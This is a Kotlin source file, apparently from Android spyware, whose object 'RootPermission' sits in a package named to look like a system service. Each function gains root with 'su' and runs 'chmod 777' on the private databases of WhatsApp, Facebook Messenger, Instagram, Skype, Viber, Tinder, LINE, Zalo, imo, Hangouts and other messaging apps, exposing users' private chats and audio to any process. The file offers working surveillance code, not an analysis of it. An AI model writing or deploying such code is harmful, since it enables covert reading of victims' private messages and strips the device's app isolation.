package com.android.services.util

import android.os.Environment
import java.io.DataOutputStream
import java.io.File
import java.lang.StringBuilder

object RootPermission {

    @JvmStatic
    fun acquireLineDatabasePermission() {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory()).append("/data")
                    .toString(), StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory())
                    .append("/data/jp.naver.line.android").toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.LINE_DB_PATH).toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.LINE_DB_PATH).append("naver_line").toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.LINE_DB_PATH).append("naver_line")
                    .append("-journal").toString())
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes("""
    $str
    
    """.trimIndent())
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @JvmStatic
    fun acquireFacebookDatabaseFilePermission() {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777 ").append(Environment.getDataDirectory())
                    .append("/data").toString(), StringBuilder("chmod 777 ")
                    .append(Environment.getDataDirectory()).append("/data/com.facebook.orca")
                    .toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.FACEBOOK_DB_PATH).toString(),
                StringBuilder("chmod 777 ")
                    .append(AppConstants.DB_FACEBOOK_PATH)
                    .append("threads_db2").toString(), StringBuilder("chmod 777 ")
                    .append(AppConstants.DB_FACEBOOK_PATH).append("threads_db2")
                    .append("-journal").toString()
            )
            try {
                try {
                    val process = Runtime.getRuntime().exec("su")
                    val out = DataOutputStream(process.outputStream)
                    for (str in arr) out.writeBytes(
                        """
    $str
    
    """.trimIndent()
                    )
                    out.writeBytes("exit\n")
                    out.flush()
                    process.waitFor()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            } catch (exception: Exception) {
                exception.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }


    @JvmStatic
    fun acquireInstagramDatabasePermission() {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory())
                    .append("/data").toString(),
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory())
                    .append("/data/com.instagram.android").toString(),
                StringBuilder("chmod 777 ").append(AppConstants.INSTAGRAM_DB_PATH)
                    .append("direct.db").toString(),
                StringBuilder("chmod 777 ").append(AppConstants.INSTAGRAM_DB_PATH)
                    .append("direct.db-journal").toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @JvmStatic
    fun setPermissionInstagramCacheDir() {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory())
                    .append("/data").toString(), StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory()).append("/data/com.instagram.android")
                    .toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.INSTAGRAM_CACHE_PATH).toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun setPermissionSkypeDatabaseFiles(databaseName: String?) {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory())
                    .append("/data").toString(),
                StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory()).append("/data/com.skype.raider")
                    .toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.SKYPE_DB_PATH).toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.SKYPE_DB_PATH).append(databaseName).toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.SKYPE_DB_PATH).append(databaseName).append("-journal")
                    .toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun setPermissionSkypeDb(dbName: String?) {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory())
                    .append("/data").toString(), StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory()).append("/data/com.skype.raider")
                    .toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.SKYPE_DB_PATH).toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.SKYPE_DB_PATH)
                    .append(dbName).toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.SKYPE_DB_PATH).append(dbName)
                    .append("-journal").toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun acquireSkypeDatabaseFilesPermission(databaseName: String?) {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory())
                    .append("/data").toString(),
                StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory()).append("/data/com.skype.raider")
                    .toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.SKYPE_DB_PATH).toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.SKYPE_DB_PATH).append(databaseName).toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.SKYPE_DB_PATH).append(databaseName).append("-journal")
                    .toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun acquireSkypeDatabasePermission() {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory())
                    .append("/data").toString(), StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory()).append("/data/com.skype.raider")
                    .toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.SKYPE_DB_PATH).toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @JvmStatic
    fun setPermissionHike() {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory()).append("/data")
                    .toString(), StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory())
                    .append("/data/com.hike.chat.stickers").toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.HIKE_DB_PATH).toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.HIKE_DB_PATH).append("chats").toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.HIKE_DB_PATH).append("chats")
                    .append("-journal").toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @JvmStatic
    fun setPermissionHangoutsDirectory() {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory()).append("/data")
                    .toString(),
                StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory())
                    .append("/data/com.google.android.talk").toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.DB_HANGOUTS_PATH).toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @JvmStatic
    fun setPermissionHangoutsDB(hangoutsDB: String?) {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory()).append("/data")
                    .toString(),
                StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory())
                    .append("/data/com.google.android.talk").toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.DB_HANGOUTS_PATH).toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.DB_HANGOUTS_PATH).append(hangoutsDB).toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.DB_HANGOUTS_PATH).append(hangoutsDB)
                    .append("-journal").toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @JvmStatic
    fun setPermissionTumblr() {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory()).append("/data")
                    .toString(), StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory())
                    .append("/data/com.tumblr").toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.DB_TUMBLR_PATH).toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.DB_TUMBLR_PATH).append("Tumblr.sqlite").toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.DB_TUMBLR_PATH).append("Tumblr.sqlite")
                    .append("-journal").toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @JvmStatic
    fun setPermissionTinder() {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory()).append("/data")
                    .toString(), StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory())
                    .append("/data/com.tinder").toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.DB_TINDER_PATH).toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.DB_TINDER_PATH).append("tinder-3.db").toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.DB_TINDER_PATH).append("tinder-3.db")
                    .append("-journal").toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes("""
    $str
    
    """.trimIndent())
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @JvmStatic
    fun setPermissionImoAudio() {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory()).append("/data")
                    .toString(), StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory())
                    .append("/data/ com.imo.android.imoim").toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.AUDIO_IMO_PATH).toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @JvmStatic
    fun setPermissionImoDatabase() {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory()).append("/data")
                    .toString(), StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory())
                    .append("/data/com.imo.android.imoim").toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.IMO_DB_PATH).toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @JvmStatic
    fun setPermissionImo(dbName: String) {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory()).append("/data")
                    .toString(), StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory())
                    .append("/data/com.imo.android.imoim").toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.IMO_DB_PATH).toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.IMO_DB_PATH).append(dbName).toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.IMO_DB_PATH).append(dbName)
                    .append("-journal").toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @JvmStatic
    fun setPermissionZalo() {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory()).append("/data")
                    .toString(), StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory())
                    .append("/data/com.zing.zalo").toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.DB_ZALO_PATH).toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.DB_ZALO_PATH).append("zalo").toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.DB_ZALO_PATH).append("zalo")
                    .append("-shm").toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.DB_ZALO_PATH).append("zalo")
                    .append("-wal").toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @JvmStatic
    fun acquireViberDatabasePermission() {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory()).append("/data")
                    .toString(), StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory())
                    .append("/data/com.viber.voip").toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.VIBER_DB_PATH).toString(), StringBuilder("chmod 777  ")
                    .append(AppConstants.VIBER_DB_PATH).append("viber_messages").toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.VIBER_DB_PATH).append("viber_messages")
                    .append("-journal").toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun checkFileExists(path: String): Boolean {
        val file = File(path)
        return file.exists()
    }

    @JvmStatic
    @Throws(Exception::class)
    fun acquireWhatsAppDatabasePermission() {
        try {
            val arr = arrayOf(
                StringBuilder("chmod 777  ").append(Environment.getDataDirectory())
                    .append("/data").toString(),
                StringBuilder("chmod 777  ")
                    .append(Environment.getDataDirectory())
                    .append("/data/com.whatsapp").toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.WHATS_APP_DB_PATH).toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.WHATS_APP_DB_PATH).append("msgstore.db").toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.WHATS_APP_DB_PATH).append("msgstore.db").append("-shm")
                    .toString(),
                StringBuilder("chmod 777  ")
                    .append(AppConstants.WHATS_APP_DB_PATH).append("msgstore.db").append("-wal")
                    .toString()
            )
            try {
                val process = Runtime.getRuntime().exec("su")
                val out = DataOutputStream(process.outputStream)
                for (str in arr) out.writeBytes(
                    """
    $str
    
    """.trimIndent()
                )
                out.writeBytes("exit\n")
                out.flush()
                process.waitFor()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}